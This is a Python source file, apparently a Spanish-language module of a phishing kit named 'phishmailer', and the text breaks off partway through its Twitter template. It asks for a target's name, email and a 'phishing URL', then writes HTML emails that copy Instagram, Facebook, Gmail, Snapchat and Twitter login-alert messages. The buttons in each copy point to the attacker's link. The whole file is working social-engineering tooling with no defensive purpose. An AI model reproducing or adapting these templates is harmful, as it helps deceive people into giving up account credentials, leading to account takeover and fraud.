import os
import sys
import time

import os

red = ("\033[1;31;40m")
green = ("\033[1;32;40m")
white = ("\033[1;37;40m")
blue = ("\033[1;34;40m")
yellow = ("\033[1;33;40m")
start = (green + "[" + white + "+" + green + "]" + white)
alert = (green + "[" + red + "!" + green + "]" + white)

def numbering(num):
  return green + "[" + white + str(num) + green + "]"

def CurrentDir():
	path = os.getcwd()
	print(green + "[" + white + "+" + green + "]" + white + " Your Templates Will Be Saved Here " + path)

def SpanishInstagram():
	Target = input(start + " Ingrese el nombre del objetivo: ")
	TargetAccount = input(start + " Ingrese el nombre de la cuenta de destino: ")
	url = input(start + " Ingrese la URL de suplantación de identidad: ")
	TargetEmail = input(start + " Ingrese el correo electrónico de destino: ")
	
	instagram = ("""
	<div dir="ltr" style="margin: 0; padding: 0;">
	<table id="m_-7319109037895721555email_table" style="border-collapse: collapse;" border="0" width="100%;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td id="m_-7319109037895721555email_content" style="font-family: Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif; background: #ffffff;">
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	<tr>
	<td style="line-height: 1px;" colspan="3" height="1">&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; border: solid 1px white; margin: 0 auto 5px auto; padding: 3px 0; text-align: center; width: 430px;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="line-height: 0px; width: 400px; padding: 0 0 15px 0;">
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 100%; text-align: left; height: 33px;"><img class="CToWUd" style="border: 0;" src="https://ci5.googleusercontent.com/proxy/JecDtiZNt9PEkLjyKXOHG6GQJ4ffCEmhMipCKh2K44CFFTTQUmX11SuvnJHe12oZWnvgg-vCdZYtV8qkSIKai4k6xSrxMCMtJH43fzHt1VFA6g=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/jxR-EPx51R9.png" height="33" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	<tr>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	<td style="border-top: solid 1px #c8c8c8;">&nbsp;</td>
	<td style="width: 15px;" width="15px">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto;" width="430" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 15px;" width="15">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse;" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<table style="border-collapse: collapse;" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Hola {},</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Alguien intentó iniciar sesión en su cuenta de Instagram {}.</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">Si era usted, utilice el siguiente código para iniciar sesión:</p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;"><span style="font-size: xx-large;">313013</span></p>
	<p style="padding: 0; margin: 10px 0 10px 0; color: #565a5c; font-size: 18px;">ISi no eras tú, por favor<a style="color: #3b5998; text-decoration: none;" href="{}" target="_blank" rel="noopener">Restablecer su contraseña</a> para asegurar tu cuenta.</p>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td>
	<table style="border-collapse: collapse; margin: 0 auto 0 auto; width: 430px;" width="430px" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="line-height: 30px;" colspan="3" height="30">&nbsp;</td>
	</tr>
	<tr>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	<td>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">&copy; Instagram, Menlo Park, CA 94022</div>
	<div style="color: #abadae; font-size: 12px; margin: 0 auto 5px auto;">Este mensaje fue enviado a <a style="color: #abadae; text-decoration: underline;">{}</a> y destinado a {}. no tu cuenta? <a style="color: #abadae; text-decoration: underline;" target="_blank" rel="noopener">Elimina tu correo electrónico</a> de esta cuenta.</div>
	</td>
	<td style="display: block; width: 20px;" width="20">&nbsp;&nbsp;&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr>
	<td style="line-height: 20px;" colspan="3" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<img class="CToWUd" style="border: 0; width: 1px; height: 1px;" src="https://ci6.googleusercontent.com/proxy/f8TdjWWQZLbPuhgu8Gz1qsup6-I9BGWATWktPEUEU4u3RYuDO6deCw2HefCgsGg7hPSe_o7aRGaEmT5eWgbbwrXbav3ivvIxslWLXecN82F4_4M8H7SteqmpOyGarWOjk28YfUHllow0QTWrPMq2HuYbfF5Q4TRWM3y3=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=HMjU0MTE4NTg0OmFwaXpwdWRpbjk2QGdtYWlsLmNvbToxNTg3" /></td>
	</tr>
	</tbody>
	</table>
	</div>""".format(Target, TargetAccount, url, Target, TargetEmail))
	
	filename = input(start + " Ingrese el nombre en el archivo HTML para guardar: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(instagram)
	Html_file.close()
	print(alert + " Archivo HTML creado")
	CurrentDir()

def SpanishFacebook():
	Target = input(start + " Ingrese el nombre del objetivo: " + white)
	TargetEmail = input(start + " Ingrese el correo electrónico de destino: " + white)
	phishURL = input(start + " Ingrese la URL de suplantación de identidad: " + white)
	Date = int(input(start + " Ingrese un número como fecha: " + white))
	
	print("")
	print(start + green + "Ingrese el mes en el que ocurrió el inicio de sesión")
	print(green + "[" + white + "1" + green + "]" + white + " enero")
	print(green + "[" + white + "2" + green + "]" + white + " febrero")
	print(green + "[" + white + "3" + green + "]" + white + " marzo")
	print(green + "[" + white + "4" + green + "]" + white + " abril")
	print(green + "[" + white + "5" + green + "]" + white + " mayo")
	print(green + "[" + white + "6" + green + "]" + white + " junio")
	print(green + "[" + white + "7" + green + "]" + white + " julio")
	print(green + "[" + white + "8" + green + "]" + white + " agosto")
	print(green + "[" + white + "9" + green + "]" + white + " septiembre")
	print(green + "[" + white + "10" + green + "]" + white + " octubre")
	print(green + "[" + white + "11" + green + "]" + white + " noviembre")
	print(green + "[" + white + "12" + green + "]" + white + " diciembre")
	monthpick = int(input(green + "root@phishmailer/mes:~ "))
	month = monthName(monthpick)
	
	print("")
	year = int(input(start + " Ingrese año: "))
	timelog = input(start + " Ingrese la hora (por ejemplo, 10:00 pm / am): ")
	city = input(start + " Ingrese el nombre de la ciudad: ")
	country = input(start + " Ingrese el nombre del paísIngrese el nombre del país: ")

	facebook = ("""
	<html><head></head><body><div style="margin:0;padding:0" dir="ltr" bgcolor="#ffffff"><table cellspacing="0" cellpadding="0" width="100%;" id="m_-5140787778864602591email_table" border="0" style="border-collapse:collapse"><tbody><tr><td id="m_-5140787778864602591email_content" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;background:#ffffff"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"><span style="color:#ffffff;display:none!important;font-size:1px"></span></td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr><tr><td width="32" align="left" valign="middle" style="height:32;line-height:0px"><a style="color:#3b5998;text-decoration:none" target="_blank"><img src="https://ci6.googleusercontent.com/proxy/EtxfQKU-LSNk3Cs2UEF2iTtMjX4XBhsW4wkC-6_XBZV22W3eB-S2JrRw027OocPIFPltHMAtxKA8QWOzc47CUrqu5jLKr9lWj_dvd8Dd1TZEpA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yk/r/_2faPUZhPI6.png" width="32" height="32" style="border:0" class="CToWUd"></a></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td width="100%"><a style="color:#3b5998;text-decoration:none;font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:19px;line-height:32px" target="_blank" >Alerta de inicio de sesión</a></td></tr><tr style="border-bottom:solid 1px #e5e5e5"><td height="16" style="line-height:16px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="28" style="line-height:28px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;font-weight:bold;color:#141823">Hola {},</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Se inició sesión en su cuenta recientemente desde un navegador o dispositivo no reconocido. ¿Este eras tú?</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><span style="font-size:10px;font-weight:bold;color:#777">Nuevo inicio de sesión</span></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci6.googleusercontent.com/proxy/DCTANTsJ1OvRNB6zZT48v37sH3JcbGz_I6HAHayvNwCn1Rob8r9MiKJ1BR-r5XeHt81lkel1D5_MiAsHRpqRfDmyzTkj2HyqQGpas_2qBbC-jg=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/OUnczqecsPd.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823"> {} {}, {} a {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci5.googleusercontent.com/proxy/QBDrjhzwIX48mu2IPh7LHsNkIiAd7lRdk76BILhcwZS9DS_KAimbh1JSh1MNokIqcjZNHvhX8is9-3t0O_8_RCsPfHnvT2X0TDGT7hbhPQOxng=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/HLjP6-RaBz8.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Cerca {}, {}</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td></td></tr><tr style="border-top:solid 1px #e5e5e5"><td height="0" style="line-height:0px">&nbsp;</td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr><tr><td><table cellspacing="0" cellpadding="0" width="100%" align="left" class="m_-5140787778864602591ib_t" style="border-collapse:collapse;min-width:420px"><tbody><tr class="m_-5140787778864602591ib_row"><td valign="top" style="padding-right:10px;font-size:0px" class="m_-5140787778864602591ib_img"><img src="https://ci3.googleusercontent.com/proxy/6eUh9zO42iKU02o2lX-pLc3uDyVFjkGqvjU7jnDgBNwGngV7cFiIa3DPoWtXpkyXqhygmeah586FIXGGQYGa6bw_Y9xD7ltzGQwaFLbzznqHzA=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/FOZusRNk18E.png" width="16px" height="16px" style="border:0" class="CToWUd"></td><td width="100%" valign="top" style="padding-right:10px" class="m_-5140787778864602591ib_mid"><span class="m_-5140787778864602591mb_text" style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:16px;line-height:21px;color:#141823">Google Chrome</span></td></tr></tbody></table></td></tr><tr><td height="14" style="line-height:14px">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td height="2" style="line-height:2px" colspan="3">&nbsp;</td></tr><tr><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #344c80;background:#4c649b;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#ffffff;font-size:14px;line-height:14px">Revisar&nbsp;acceso</span></font></center></a></td></tr></tbody></table></a></td><td width="10" style="display:block;width:10px" class="m_-5140787778864602591mb_hide">&nbsp;&nbsp;&nbsp;</td><td class="m_-5140787778864602591mb_blk"><a href="{}" style="color:#3b5998;text-decoration:none" target="_blank"><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr><td style="border-collapse:collapse;border-radius:2px;text-align:center;display:block;border:solid 1px #c9ccd1;background:#f6f7f8;padding:7px 16px 11px 16px"><a href="{}" style="color:#3b5998;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#525252;font-size:14px;line-height:14px">Gestionar&nbsp;Alertas</span></font></center></a></td></tr></tbody></table></a></td><td width="100%" class="m_-5140787778864602591mb_hide"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td><td><table cellspacing="0" cellpadding="0" width="100%" style="border-collapse:collapse"><tbody><tr style="border-top:solid 1px #e5e5e5"><td height="16" style="line-height:16px">&nbsp;</td></tr><tr><td style="font-family:Helvetica Neue,Helvetica,Lucida Grande,tahoma,verdana,arial,sans-serif;font-size:11px;color:#aaaaaa;line-height:16px">Este mensaje fue enviado a <a href="" style="color:#3b5998;text-decoration:none" target="_blank">{}/a>. Si no desea recibir estos correos electrónicos de Facebook en el futuro, por favor <a href="" style="color:#3b5998;text-decoration:none" target="_blank" data-saferedirecturl="#link11">darse de baja</a>.<br>Facebook, Inc., Attention: Community Support, 1 Hacker Way, Menlo Park, CA 94025</td></tr></tbody></table></td><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody></table><span><img src="https://ci5.googleusercontent.com/proxy/HW2B-_UGsdk69Jyhg1T6TPoP85hYe1BMFUnXG1tzXLvolAUwH6t0YiIo4qp5aCDfKneX2WoPW8rAE0T34kLDIX0mSXZNOiQuEaPUHdAvImAazBZauNI1_PSndHlRvKy951jvWI5bsvfOh2oBJC7IqpAoyZXzYQ=s0-d-e1-ft#https://www.facebook.com/email_open_log_pic.php?mid=5464d188693c7G5af398d232efG5464d621c9699G2bf" style="border:0;width:1px;height:1px" class="CToWUd"></span></td></tr></tbody></table></div></div></div> </div></div></div></div></div></div></div></div></body></html>
	""".format(Target, month, Date, year, timelog, city, country,phishURL, phishURL, phishURL, phishURL, TargetEmail))
	
	print("")
	filename = input(start + " Ingrese el nombre en el archivo HTML para guardar: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(facebook)
	Html_file.close()
	print(alert + " Archivo HTML creado")


def SpanishGmailActivity():
	email = input(start + " Ingrese el correo electrónico de destino: ")
	url = input(start + " Ingrese su URL de phishing: ")
	
	sourcecode = ("""
	<div style="margin: 0; padding: 0;"><img src="https://notifications.googleapis.com/email/t/AFG8qyX1N_r29I45LMotMWsye64za9dbvJiyZgdgizAGJw1L7gbGf8c45Hpsrd2cJlaFZnZCfo8rbM6s1bJe91QnxNeUB2v7DpR9BJkQ6RScy8EfVFqaQS1DG_fW9CnrF2NMvgM9Caq7MczU-jDToF4iWHKayK4ji5x1qf6LozELELyhyTmFDalDEplYkEtbUM6dJF3HqWcsLqmQq4TrbbFtGcoIg-wEc76Skkq59dys8PX_Cm5T12R7I-hcd9jLZaukEASj_0r_0GkmpfRp-ulF7yvIuE7Z5O4stFo/a.gif" width="1" height="1" />
	<table lang="en" style="min-width: 348px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr style="height: 32px;">
	<td>&nbsp;</td>
	</tr>
	<tr align="center">
	<td>
	<div>&nbsp;</div>
	<table style="padding-bottom: 20px; max-width: 516px; min-width: 220px;" border="0" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="width: 8px;" width="8">&nbsp;</td>
	<td>
	<div style="border-radius: 8px; padding: 40px 20px; border: thin solid #dadce0;" align="center"><img style="margin-bottom: 16px;" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google" width="74" height="24" />
	<div style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; border-bottom: thin solid #dadce0; color: rgba(0,0,0,0.87); line-height: 32px; padding-bottom: 24px; text-align: center; word-break: break-word;">
	<div style="text-align: center; padding-bottom: 16px; line-height: 0;"><img src="https://www.gstatic.com/images/icons/material/system/2x/error_red_36dp.png" height="33" /></div>
	<div style="font-size: 24px;">Se bloqueó el intento de inicio de sesión</div>
	<table style="margin-top: 8px;" align="center">
	<tbody>
	<tr style="line-height: normal;">
	<td style="padding-right: 8px;" align="right"><img style="width: 20px; height: 20px; vertical-align: sub; border-radius: 50%;" src="https://www.gstatic.com/accountalerts/email/anonymous_profile_photo.png" alt="" width="20" height="20" /></td>
	<td><a style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">{}</a></td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 14px; color: rgba(0,0,0,0.87); line-height: 20px; padding-top: 20px; text-align: left;">Alguien acaba de usar tu contraseña para intentar iniciar sesión en tu cuenta desde una aplicación que no es de Google. Google los bloqueó, pero deberías comprobar qué pasó. Revise la actividad de su cuenta para asegurarse de que nadie más tenga accesos.
	<div style="padding-top: 32px; text-align: center;"><a style="font-family: 'Google Sans',Roboto,RobotoDraft,Helvetica,Arial,sans-serif; line-height: 16px; color: #ffffff; font-weight: 400; text-decoration: none; font-size: 14px; display: inline-block; padding: 10px 24px; background-color: #d94235; border-radius: 5px; min-width: 90px;" href="{}" target="_blank" rel="noopener">Consultar actividad</a></div>
	</div>
	</div>
	<div style="text-align: left;">
	<div style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">
	<div>Recibió este correo electrónico para informarle sobre cambios importantes en su cuenta de Google y sus servicios..</div>
	<div style="direction: ltr;">&copy; 2021 Google LLC, <a style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">1600 Amphitheatre Parkway, Mountain View, CA 94043, USA</a></div>
	</div>
	</div>
	</td>
	<td style="width: 8px;" width="8">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="height: 32px;">
	<td>&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</div>""".format(email, url))

	
	filename = input(start + " Ingrese el nombre en el archivo HTML para guardar: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(sourcecode)
	Html_file.close()
	print(alert + " Archivo HTML creado")


def SpanishSnapchatSimple():
	username = input(start + " Ingrese el nombre de usuario de destino: ")
	Url = input(start + " Ingrese su URL de phishing: ")

	source = ("""
	<div style="background-color:#f6f6f6;color:#000000">
	<center>
		<table style="max-width:620px;border-collapse:collapse;margin:0 auto 0 auto" width="620" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			<tr>
				<td>
					<table style="max-width:580px;padding-left:20px;padding-right:20px" width="580" cellspacing="0" cellpadding="0" border="0">
						<tbody>
						<tr>
							<td style="line-height:0;padding-top:50px" align="left">
								<img src="https://storage.googleapis.com/scan-snapchat.appspot.com/creative-camera/confirm-header.png" style="background:#f6f6f6">
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p style="font-size:45px;color:#000000;letter-spacing:-1.5px">
									Confirme su email?</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-left:20px;padding-right:20px;padding-top:29.8px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" border="0" align="left">
								<p>
									<span style="display:block">Hola <span style="font-family:AvenirNext-DemiBold,'Droid Sans monospace',Roboto,Arial,sans-serif">{}</span>,</span>
									<span style="display:block">Gracias por agregar su dirección de correo electrónico a Snapchat. Confirme su correo electrónico a continuación para que pueda restablecer su cuenta si olvida su contraseña.</span>
								</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-top:10px" align="center">
								<a target="_blank" href="{}">
									Confirme su dirección de correo electrónico
								</a>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="padding-left:20px;padding-right:20px;padding-top:29.8px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" border="0" align="left">
								<p style="margin-bottom:0px">Si esta no es su cuenta de Snapchat, o si no se registró en Snapchat, por favor<a target="_blank" href="{}">Haga clic aquí</a> para eliminar su dirección de correo electrónico de esta cuenta.</p>
							</td>
						</tr>
						<tr style="background:#ffffff">
							<td style="font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p style="font-size:45px;color:#000000;letter-spacing:-1.5px;padding-top:30px">
									Contenta Snapping!</p>
							</td>
						</tr>
						<tr>
							<td align="left">
								<img src="https://storage.googleapis.com/scan-snapchat.appspot.com/creative-camera/confirm-footer.png" style="background:#f6f6f6">
							</td>
						</tr>
						<tr>
							<td style="margin-top:0;margin-bottom:0;color:#262626;font-size:17px;padding-top:30px;padding-bottom:70px;letter-spacing:0;line-height:35px;font-family:AvenirNext-Regular,Droid Sans monospace,Roboto,Arial,sans-serif" align="center">
								<p>
									<span style="display:block">© Snap Inc.  &nbsp;&nbsp;|&nbsp;&nbsp; <a target="_blank" style="text-decoration:none;color:#0eadff" href="{}">Condiciones</a></span>
									<span style="display:block"><a target="_blank" style="text-decoration:none;color:#000000" href="{}">https://support.snapchat.com</a></span>
									<span style="display:block">Snap Inc., 63 Market Street, Venice CA 90291</span>
								</p>
							</td>
						</tr>
						</tbody>
					</table>
				</td>
			</tr>
			</tbody>
		</table>
	</center>
	</div>
	</div></div>""".format(username, Url, Url, Url, Url))

	filename = input(start + " Ingrese el nombre en el archivo HTML para guardar: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " Archivo HTML creado")


def SpanishTwitter():
	AccountName = input(start + " Ingrese el nombre de usuario de destino: ")
	TargetName = input(start + " Ingrese el nombre del objetivo: ")
	City = input(start + " Ingrese el nombre de la ciudad: ")
	Country = input(start + " Ingrese el nombre del paísIngrese el nombre del país: ")
	PhishUrl = input(start + " Ingrese la URL de suplantación de identidad: ") 
	MustContain = input(start + " Su URL contiene (Word en dominio): ")
	Extension = input(start + " Ingrese su dominio (ejemplo '.com'): ")
	twitter = ("""<div bgcolor="#F5F8FA" style="margin:0;padding:0"><table cellpadding="0" cellspacing="0" border="0" width="100%" bgcolor="#F5F8FA" style="background-color:#f5f8fa;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937body_wrapper"><tbody><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td style="min-width:448px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937cut"> <img src="https://ci5.googleusercontent.com/proxy/dZihfURYMr4ltOGMmSu7g3JXn4x0ue5ctCYAEwZ-rv1Lx8G77mg5v7CCPyDYzWr4uj2cpj6-5f0-LRFTlHdmZ14PL7dREA1lSKWeXxIwyQjf9Bdb1yJ3JcrK=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/spacer-1402696023930.png" style="min-width:448px;height:1px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </td></tr></tbody></table> </td></tr><tr><td align="center" style="padding:0;margin:0;line-height:1px;font-size:1px"><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" style="width:448px;background-color:#ffffff;padding:0;margin:0;line-height:1px;font-size:1px" bgcolor="#ffffff" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td colspan="3" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> &nbsp; </td></tr><tr align="right"><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td><td align="right" style="padding:0;margin:0;line-height:1px;font-size:1px"> <a href="#m_7210276772504823937_" style="text-decoration:none;border-style:none;border:0;padding:0;margin:0"> <img width="32" align="right" src="https://ci6.googleusercontent.com/proxy/7uJiuTOo6rMk0ahEnEhjXzhKVdtkt-IgM_uCWBYJd8SjMK2uFYPnfc9tFTdYP-OAHBQWBjjS-gNGUpaW67od9X37iuyFD32VfvDGDyXB1DDj-o0HyZXQdxkFn8uPO3ydU9rPwA=s0-d-e1-ft#https://ea.twimg.com/email/self_serve/media/Twitter_logo_180-1468901451975.png" style="width:32px;margin:0;padding:0;display:block;border:none;outline:none" class="CToWUd"> </a> </td><td width="24" class="m_7210276772504823937margin" style="padding:0;margin:0;line-height:1px;font-size:1px"></td></tr><tr><td colspan="4" height="24" style="height:24px;padding:0;margin:0;line-height:1px;font-size:1px" class="m_7210276772504823937logo_space"> <img width="1" height="1" style="display:block;margin:0;padding:0;display:block;border:none;outline:none" src="https://ci6.googleusercontent.com/proxy/DcPlfaEWAKqTloO57NjmsI2d7aQm9ZJE7V1xVBepiu2RDkg2ScBv6cld0fmGgPGWqlUp2IghtFNnNIr7ap2zdki9k3RW8ftVByQdeahXNIPYHI4WNspFWCV3oCaqQlH8XsU7lG9hTHrZwYJZ_LgibzX_SE10SkLb7KMvaZDd-zrTpRqBQTwZKEa8ZknEgYHIZdakbg=s0-d-e1-ft#https://twitter.com/scribe/ibis?t=1&amp;cn=bG9naW5fbm90aWZpY2F0aW9u&amp;iid=d245d496e25743259b05c4aeaf0b44cf&amp;uid=2356568077&amp;nid=244+20" class="CToWUd"> </td></tr></tbody></table><table class="m_7210276772504823937collapse" id="m_7210276772504823937header" align="center" width="448" 